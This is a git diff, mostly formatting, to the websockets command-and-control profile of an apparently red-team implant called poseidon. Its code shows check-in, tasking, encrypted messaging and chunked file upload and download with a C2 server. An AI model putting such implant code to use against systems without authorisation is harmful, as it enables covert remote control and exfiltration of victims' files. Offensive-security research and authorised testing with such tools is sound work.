@@ -1,4 +1,4 @@
-// +build websockets, linux darwin
+// +build websockets
 
 package profiles
 
@@ -8,14 +8,15 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/gorilla/websocket"
-	"github.com/xorrior/poseidon/pkg/utils/crypto"
-	"github.com/xorrior/poseidon/pkg/utils/structs"
 	"log"
 	"math"
 	"os"
 	"strings"
 	"time"
+
+	"github.com/gorilla/websocket"
+	"github.com/xorrior/poseidon/pkg/utils/crypto"
+	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
 const (
@@ -59,7 +60,7 @@ type C2Websockets struct {
 	UUID           string
 	AesPSK         string
 	RsaPrivateKey  *rsa.PrivateKey
-	Conn *websocket.Conn
+	Conn           *websocket.Conn
 }
 
 func newProfile() Profile {
@@ -170,14 +171,14 @@ func (c *C2Websockets) GetTasking() interface{} {
 	return task
 }
 
-func (c *C2Websockets) PostResponse(task structs.Task, output string) []byte  {
+func (c *C2Websockets) PostResponse(task structs.Task, output string) []byte {
 	taskResp := structs.TaskResponse{}
 	taskResp.Response = base64.StdEncoding.EncodeToString([]byte(output))
 	dataToSend, _ := json.Marshal(taskResp)
 	return c.sendData(ResponseMsg, TASKIDType, task.ID, dataToSend)
 }
 
-func (c *C2Websockets) SendFile(task structs.Task, params string)  {
+func (c *C2Websockets) SendFile(task structs.Task, params string) {
 	fileReq := structs.FileRegisterRequest{}
 	fileReq.Task = task.ID
 	path := task.Params
@@ -200,7 +201,7 @@ func (c *C2Websockets) SendFile(task structs.Task, params string)  {
 	c.SendFileChunks(task, raw)
 }
 
-func (c *C2Websockets) GetFile(task structs.Task, fileid string) []byte {
+func (c *C2Websockets) GetFile(fileid string) []byte {
 	fileData := c.getData(FileMsg, FileIDType, fileid)
 
 	return fileData
@@ -258,7 +259,7 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte) {
 		time.Sleep(time.Duration(c.Interval) * time.Second)
 	}
 
-	c.PostResponse(task , "File download complete")
+	c.PostResponse(task, "File download complete")
 }
 
 func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) interface{} {
@@ -287,7 +288,7 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) int
 	} else if len(c.AesPSK) != 0 {
 		resp = c.sendData(AES, UUIDType, c.UUID, checkinMsg)
 	} else {
-		resp = c.sendData(CheckInMsg , UUIDType, c.UUID, checkinMsg)
+		resp = c.sendData(CheckInMsg, UUIDType, c.UUID, checkinMsg)
 	}
 
 	respMsg := structs.CheckinResponse{}
@@ -358,7 +359,6 @@ func (c *C2Websockets) sendData(msgType int, idType int, id string, data []byte)
 		m.Enc = true
 	}
 
-
 	m.MType = msgType
 	m.IDType = idType
 	m.Data = base64.StdEncoding.EncodeToString(data)
@@ -375,7 +375,7 @@ func (c *C2Websockets) sendData(msgType int, idType int, id string, data []byte)
 		return make([]byte, 0)
 	}
 
-	if len(c.AesPSK) != 0 && c.ExchangingKeys != true{
+	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
 		raw, _ := base64.StdEncoding.DecodeString(m.Data)
 		decData := c.decryptMessage(raw)
 		return decData
